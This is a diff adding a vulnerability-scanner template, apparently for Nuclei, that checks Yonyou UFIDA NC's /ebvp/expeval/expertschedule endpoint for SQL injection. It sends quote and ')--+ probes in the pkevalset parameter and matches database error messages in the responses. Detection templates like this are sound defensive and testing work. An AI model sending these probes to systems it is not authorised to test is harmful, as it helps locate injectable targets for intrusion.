@@ -1,0 +1,30 @@
+id: yonyou-nc-expertschedule-sqli
+info:
+  name: 用友 UFIDA NC expertschedule - sqli
+  author: leadlife
+  severity: high
+  description: 用友NC /expertschedule 路径存在SQL注入漏洞，该漏洞允许攻击者在应用程序的数据库查询中注入恶意的SQL代码。通常发生在应用程序未对用户输入进行充分验证和过滤。
+  reference: 
+    - demo
+  metadata:
+    verified: true
+    fofa-query: demo
+  tags: yonyou,nc,oa,sqli
+
+http:
+  - raw:
+      - |
+        GET /ebvp/expeval/expertschedule?pkevalset=' HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /ebvp/expeval/expertschedule?pkevalset=')--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200  && status_code_2 == 200
+          - contains_all(body_1,'查询错误','ec_eval_set.pk_eval_set')
+          - contains_all(body_2,'错误提示','/ebvp/images/expeval/error.png')
+        condition: and
